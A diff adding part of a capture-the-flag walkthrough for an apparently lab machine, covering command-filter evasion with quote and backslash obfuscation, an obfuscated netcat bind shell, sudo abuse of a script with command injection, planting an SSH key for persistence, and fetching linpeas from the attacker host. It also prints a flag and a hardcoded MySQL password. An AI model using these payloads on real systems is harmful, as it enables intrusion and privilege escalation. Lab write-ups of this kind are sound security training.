@@ -104,5 +104,163 @@ aurick:x:1000:
 apaar:x:1001:
 anurodh:x:1002
 ```
-So we've enumerated the users.
-Maybe one of them has a weak password?
+That's alright, but we don't go any further. 
+
+**Obfuscation is the key.**
+
+I did some testing, and found out that commands are blocked based on keywords. If there's a `python`, `nc` or even `ls` keyword, it'll fail. <br>
+There are several ways to break the filtering. Most obvious ones are using `'` signs and a backslash `\` sign.
+
+This way we can execute any command we want!
+```
+command: l's'
+response: images index.php
+
+command: l\s
+response: images index.php
+```
+>Filtering evasion is quite the rabbithole, and I'd love to dive into it soon!
+
+I've opened up my trustworthy reverse shells and obfuscated one of them:
+```
+command: mk'fif'o /tmp/f; 'n'c -lv'n'p 5217 < /t'm'p/f | /'b'in/'s'h >/t'm'p/f 2>&1; 'r'm /t'm'p/f
+```
+Response: It hanged! Meaning it's listening for incoming connections.
+
+```
+└─$ nc -nv 10.80.129.48 5217
+(UNKNOWN) [10.80.129.48] 5217 (?) open
+whoami
+www-data
+```
+We have a very simple, unstable session here. We need to upgrade it. 
+Python is available, now it's a walk in a park.<br>
+```
+python3 --version
+Python 3.8.10
+python3 -c "import pty; pty.spawn('/bin/bash')"
+www-data@ip-10-80-129-48:/var/www/html/secret$ 
+```
+>I've used -c parameter to execute python commands directly from the command line
+
+So what now? We still don't have access to user profiles!
+```
+www-data@ip-10-82-186-223:/home/apaar$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ip-10-82-186-223:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-82-186-223:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+```
+Ooooh.. So we can run a shell script with sudo rights? 
+
+What's inside?
+```
+www-data@ip-10-82-186-223:/home/apaar$ cat /home/apaar/.helpline.sh
+cat /home/apaar/.helpline.sh
+#!/bin/bash
+
+echo
+echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
+echo
+
+read -p "Enter the person whom you want to talk with: " person
+
+read -p "Hello user! I am $person,  Please enter your message: " msg
+
+$msg 2>/dev/null
+
+echo "Thank you for your precious time!"
+```
+Command execution vulnerability
+```
+www-data@ip-10-82-186-223:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
+<html/secret$ sudo -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: test
+test
+Hello user! I am test,  Please enter your message: /bin/bash
+/bin/bash
+whoami
+whoami
+apaar
+```
+
+```
+apaar@ip-10-82-186-223:~$ cat /home/apaar/local.txt
+cat /home/apaar/local.txt
+{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+```
+We need to somehow login into apaar ssh.
+```
+└─# ssh-keygen -f apaar
+Generating public/private ed25519 key pair.
+Enter passphrase for "apaar" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in apaar
+Your public key has been saved in apaar.pub
+The key fingerprint is:
+SHA256:0TAXF5pv43c3HgXVlzUBVtcra5e/qC/udH//RzDG6oY root@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|        o o.o+o+X|
+|         = +.  o*|
+|        . +  .. o|
+|         . . .=o |
+|        S   +oooo|
+|           o.+ oo|
+|           +o.o++|
+|          E.+.+.B|
+|          o=+o +O|
++----[SHA256]-----+
+```
+```
+apaar@ip-10-82-186-223:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGpVCB2MhtgWdhDHf8izVo9fAjkoRWY6Fu8uobrqtPAE root@kali" > authorized_keys
+apaar@ip-10-82-186-223:~/.ssh$ <9fAjkoRWY6Fu8uobrqtPAE root@kali" > authorized_keys
+```
+In other terminal
+```
+└─# ssh -i apaar apaar@10.82.186.223
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key 'apaar':
+Last login: Sat Jan 24 12:34:13 2026 from 192.168.136.34
+apaar@ip-10-82-186-223:~$ 
+```
+```
+└─# wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
+└─# python3 -m http.server 5217
+Serving HTTP on 0.0.0.0 port 5217 (http://0.0.0.0:5217/) ...
+```
+```
+apaar@ip-10-82-186-223:/tmp$ wget http://192.168.136.34:5217/linpeas.sh
+--2026-01-24 12:40:22--  http://192.168.136.34:5217/linpeas.sh
+Connecting to 192.168.136.34:5217... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1007100 (983K) [application/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                      100%[======================================================>] 983.50K  2.90MB/s    in 0.3s    
+
+2026-01-24 12:40:22 (2.90 MB/s) - ‘linpeas.sh’ saved [1007100/1007100]
+```
+There are two ports that nmap didn't show us:
+```
+3306 mysql
+9001 http
+```
+Interestingly, there's a password for the mysql in index.php:
+```
+apaar@ip-10-82-186-223:/var/www/files$ cat index.php
+...
+$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
+```
+Next we'll gonna break into mssql server..
+
+zmienic IP od polowy writeupu bo zmienilem maszyne.
+
